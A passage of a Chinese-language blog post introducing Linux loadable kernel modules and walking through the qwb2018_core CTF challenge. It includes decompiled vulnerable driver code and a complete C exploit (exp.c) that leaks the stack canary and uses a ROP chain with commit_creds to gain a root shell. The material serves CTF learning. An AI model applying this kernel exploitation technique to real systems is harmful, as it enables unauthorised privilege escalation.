内核采用宏内核架构，但是内核装载的很多服务其实很少用到甚至用不到，但它们会占据大量内存空间，且添加、修改、删除服务往往要重新编译整个内核，浪费时间</p><p>可装载内核模块（Loadable Kernel Module）因此出现，在内核中它可以自由地装载或卸载，而不用重新编译、重启内核，提高了内核的可拓展性和维护性。而设备驱动就是其中一种</p><p>CTF 中的 kenrel pwn 往往就是通过 LKM 的漏洞来控制内核，而不是 pwn 内核组件</p><h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><p>LKM 同样也是 ELF 格式文件，但不能独立运行，必须装载在内核中运行，并且上下文为内核空间</p><p>因此 LKM 不能使用共享库中的函数，也不能直接与用户进行交互，它必须使用内核提供的函数，在某种意义上来说 LKM 编程也是内核编程</p><h3 id="编写一个简单模块"><a href="#编写一个简单模块" class="headerlink" title="编写一个简单模块"></a>编写一个简单模块</h3><figure class="highlight c"><figcaption><span>hello_kernel.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* hello_kernel.c</span></span><br><span class="line"><span class="comment">* developed by Humoooor</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">kernel_module_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt; Hello the Linux kernel world!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">kernel_module_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123; </span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt; Good bye the Linux kernel world! See you again!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(kernel_module_init);</span><br><span class="line">module_exit(kernel_module_exit);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Humoooor&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>头文件<ul><li><code>linux/module.h</code>：LKM 必须包含</li><li><code>linux/kernel.h</code>：载入内核相关信息</li><li><code>linux/init.h</code>：包含一些常用的宏</li><li>一般这三个头文件在 LKM 编程中都要使用</li></ul></li><li>LKM 入口点/出口点<ul><li><code>module_init</code>：内核载入 LKM 时会缺省调用</li><li><code>module_exit</code>：内核卸载 LKM 时会缺省调用</li></ul></li><li>其他<ul><li><code>__init</code> 和 <code>__exit</code>：在函数结束后释放对应内存</li><li><code>MODULE_LICENSE</code> 和 <code>MODULE_AUTHOR</code>：声明 LKM 作者和许可证</li><li><code>printk</code>：内核函数，向内核缓冲区写入，<code>&lt;1&gt;</code> 表示信息的紧急级别（8 个优先级，0 为最高）</li></ul></li></ul><h3 id="编译-LKM"><a href="#编译-LKM" class="headerlink" title="编译 LKM"></a>编译 LKM</h3><p>一般使用 Makefile 来编译 LKM</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">obj-m += hello_kernel.o</span><br><span class="line">CURRENT_PATH := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line">LINUX_KERNEL := <span class="variable">$(<span class="built_in">shell</span> uname -r)</span></span><br><span class="line">LINUX_KERNEL_PATH := /usr/src/linux-headers-<span class="variable">$(LINUX_KERNEL)</span></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    make -C <span class="variable">$(LINUX_KERNEL_PATH)</span> M=<span class="variable">$(CURRENT_PATH)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    make -C <span class="variable">$(LINUX_KERNEL_PATH)</span> M=<span class="variable">$(CURRENT_PATH)</span> clean</span><br></pre></td></tr></table></figure><ul><li><code>obj-m</code>：指定了编译的结果应当为 <code>.ko</code> 文件，即可装载内核模块，类似命令有：<code>obj-y</code> 编译进内核，<code>obj-n</code> 不编译</li><li><code>CURRENT_PATH &amp; LINUX_KERNEL &amp; LINUX_KERNEL_PATH</code>：三个自定义变量，分别意味着通过 shell 命令获得当前路径、内核版本、内核源码路径</li><li><code>all</code>：编译指令</li><li><code>clean</code>：清理指令</li></ul><p>使用 <code>make</code> 命令即可编译生成 hello_kernel.ko 文件</p><h3 id="使用-LKM"><a href="#使用-LKM" class="headerlink" title="使用 LKM"></a>使用 LKM</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 装载 LKM</span></span><br><span class="line">sudo insmod hello_kernel.ko</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 LKM</span></span><br><span class="line">lkmod | grep hello_kernel</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载 LKM</span></span><br><span class="line">sudo rmmod hello_kernel.ko</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 LKM 输出信息</span></span><br><span class="line">dmesg | grep <span class="string">&quot;kenrel module&quot;</span></span><br></pre></td></tr></table></figure><h2 id="入门题-qwb2018-core"><a href="#入门题-qwb2018-core" class="headerlink" title="入门题 qwb2018_core"></a>入门题 qwb2018_core</h2><h3 id="查看脚本"><a href="#查看脚本" class="headerlink" title="查看脚本"></a>查看脚本</h3><p>看一下启动脚本 start.sh</p><figure class="highlight bash"><figcaption><span>start.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \  </span><br><span class="line">-m 64M \  </span><br><span class="line">-kernel ./bzImage \  </span><br><span class="line">-initrd  ./core.cpio \  </span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \  </span><br><span class="line">-s  \  </span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \  </span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure><p>开启 kaslr，可以先关闭 kaslr 获取没有偏移的函数地址</p><p>再看一下 init 脚本</p><figure class="highlight bash"><figcaption><span>init</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh  </span></span><br><span class="line">mount -t proc proc /proc  </span><br><span class="line">mount -t sysfs sysfs /sys  </span><br><span class="line">mount -t devtmpfs none /dev  </span><br><span class="line">/sbin/mdev -s  </span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts  </span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts  </span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx  </span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms  </span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict  </span><br><span class="line">ifconfig eth0 up  </span><br><span class="line">udhcpc -i eth0  </span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0  </span><br><span class="line">route add default gw 10.0.2.2    </span><br><span class="line">insmod /core.ko  </span><br><span class="line">   </span><br><span class="line">poweroff -d 120 -f &amp;  </span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh  </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span>  </span><br><span class="line">umount /proc  </span><br><span class="line">umount /sys  </span><br><span class="line">   </span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p><del>看不太懂，先把 poweroff 注释掉再打包回去再说</del></p><p>这里把 kallsyms 复制过去了，可以得到内核各个符号的地址</p><p>注意这里的解包和打包不太一样，发现还有一层 gzip 的压缩，卡了好久 wsfw</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o -H newc | gzip -9 &gt; ../core.cpio</span><br><span class="line"></span><br><span class="line"><span class="comment"># 后来发现自带了打包脚本 gen_cpio.sh</span></span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; <span class="variable">$1</span></span><br></pre></td></tr></table></figure><h3 id="分析-LKM"><a href="#分析-LKM" class="headerlink" title="分析 LKM"></a>分析 LKM</h3><p>浅浅 checksec 一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec core.ko</span><br><span class="line">   Arch:     amd64-64-little</span><br><span class="line">   RELRO:    No RELRO</span><br><span class="line">   Stack:    Canary found</span><br><span class="line">   NX:       NX enabled</span><br><span class="line">   PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><p>然后直接拖入 IDA 即可</p><p>先看看 <code>init_module</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">0666LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(&amp;unk_2DE);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建一个进程节点文件 <code>/proc/core</code>，用于用户进程与 LKM 通信</p><p>查看 core_fops 结构体，定义了三个函数</p><ul><li><code>core_write</code>：调用 <code>write</code> 时，内核调用此函数</li><li><code>core_ioctl</code>：调用 <code>ioctl</code> 时，内核调用此函数</li><li><code>core_release</code>：只有打印功能，还是看看 <code>core_write</code> 和 <code>core_ioctl</code> 家人们</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_write</span><span class="params">(__int64 fd, __int64 user, <span class="type">unsigned</span> __int64 size)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(&amp;name, user, size) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)size;</span><br><span class="line">  printk(&amp;unk_230);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFF2</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>core_write</code> 向 bss 写入最多 0x800 字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 fd, <span class="type">int</span> choice, __int64 value)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( choice )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(value);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = value;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(value);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>core_ioctl</code> 可调用 <code>core_read</code>、<code>core_copy_func</code> 函数，且可以设置全局变量 off 的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">core_read</span><span class="params">(__int64 addr_user)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B);</span><br><span class="line">  printk(&amp;unk_275);</span><br><span class="line">  v2 = buf;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  result = copy_to_user(addr_user, &amp;buf[off], <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>core_read</code> 复制栈中 64 字节到用户进程空间，由于 off 可控，可以用来泄露地址和 canary</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_copy_func</span><span class="params">(__int64 size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(v2, &amp;name, (<span class="type">unsigned</span> __int16)size);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>core_copy_func</code> 传入一个 64 位大小的 size，复制 bss 上的数据到栈中</p><p>size 有检查，但是最后取 size 的低 16 位，传入一个合适负数就可以最多复制 0xffff 字节的 bss 到栈中，导致栈溢出，进行 ROP</p><h3 id="漏洞利用-ROP"><a href="#漏洞利用-ROP" class="headerlink" title="漏洞利用 ROP"></a>漏洞利用 ROP</h3><p>漏洞利用已经很明了</p><ul><li><code>core_read</code> 可以溢出读栈，拿到 canary 和基址<ul><li>这里提一嘴，才知道 canary 是一个线程一个，之前以为一个函数一个，一直没想出来怎么做😇</li></ul></li><li><code>core_copy_func</code> 可以溢出写栈，进行 ROP</li></ul><p>思路</p><ol><li>读取 kallsyms 获取 <code>prepare_kernel_cred</code> 和 <code>commit_creds</code> 的函数地址</li><li>通过 <code>core_read</code> 获取 canary 和基址</li><li>通过 <code>core_write</code> 写 ROP 链到 bss</li><li>通过 <code>core_copy_func</code> 复制 ROP 链栈溢出</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><figcaption><span>exp.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../mypwn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> iretq 0xffffffff81050ac2 + offset</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> swapgs_popfq_ret 0xffffffff81a012da + offset</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdi_ret 0xffffffff81000b2f + offset</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mov_rdi_rax_jmp_rdx 0xffffffff8106a6d2 + offset</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdx_ret 0xffffffff810a0f49 + offset</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> swapgs_restore_ret</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mov_cr4_rdi_push_rdx_popfq_ret 0xffffffff81075014 + offset</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ 0x6677889B</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OFF 0x6677889C</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COPY_FUNC 0x6677889A</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(fd, READ, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_set_off_val</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span> off)</span> &#123;</span><br><span class="line">    ioctl(fd, OFF, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    ioctl(fd, COPY_FUNC, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> addr, offset, canary;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rop_chain[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x300</span>];</span><br><span class="line">    <span class="type">char</span> type[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line">    myLog(<span class="string">&quot;Start to pwn kernel&quot;</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get canary &amp; prepare_kernel_cred &amp; commit_creds from kallsyms</span></span><br><span class="line">    get_privilege_addr(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    offset = commit_creds - <span class="number">0xffffffff8109c8e0</span>;</span><br><span class="line">    myLog(<span class="string">&quot;Get offset: %p&quot;</span>, offset);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get canary</span></span><br><span class="line">    core_set_off_val(fd, <span class="number">64</span>);</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    canary = ((<span class="type">unsigned</span> <span class="type">long</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    myLog(<span class="string">&quot;Get canary: %p&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        rop_chain[i] = canary;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// ROP!</span></span><br><span class="line">    rop_chain[i++] = pop_rdi_ret;</span><br><span class="line">    rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">    rop_chain[i++] = prepare_kernel_cred;</span><br><span class="line">    rop_chain[i++] = pop_rdx_ret;</span><br><span class="line">    rop_chain[i++] = commit_creds;</span><br><span class="line">    rop_chain[i++] = mov_rdi_rax_jmp_rdx;</span><br><span class="line">    rop_chain[i++] = swapgs_popfq_ret;</span><br><span class="line">    rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">    rop_chain[i++] = iretq;</span><br><span class="line">    rop_chain[i++] = get_root_shell;</span><br><span class="line">    rop_chain[i++] = user_cs;</span><br><span class="line">    rop_chain[i++] = user_rflags;</span><br><span class="line">    rop_chain[i++] = user_sp;</span><br><span class="line">    rop_chain[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop_chain, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://arttnba3.cn/2021/02/22/OS-0X01-LINUX-KERNEL-PART-II/">【OS.0x01】Linux Kernel II：内核简易食用指北</a></p><p><a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/">【PWN.0x00】Linux Kernel Pwn I：Basic Exploit to Kernel Pwn in CTF</a></p><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/basic-knowledge/">https://ctf-wiki.org/pwn/linux/kernel-mode/basic-knowledge/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本机环境为 Ubuntu 22.04 x86_64&lt;/p&gt;
&lt;p&gt;首先感谢 a3gg 让我们避免入门 Kernel Pwn 路上的很多坑&lt;/p&gt;</summary>
    
    
    
    <category term="Pwn" scheme="https://humoooor.cn/categories/Pwn/"/>
    
    
    <category term="Linux Kernel" scheme="https://humoooor.cn/tags/Linux-Kernel/"/>
    
  </entry>
  
  <entry>
    <title>2023.06</title>
    <link href="https://humoooor.cn/2023/06/05/2023.06/"/>
    <id>https://humoooor.cn/2023/06/05/2023.06/</id>
    <published>2023-06-05T03:04:00.000Z</published>
    <updated>2024-01-04T04:30:28.418Z</updated>
    
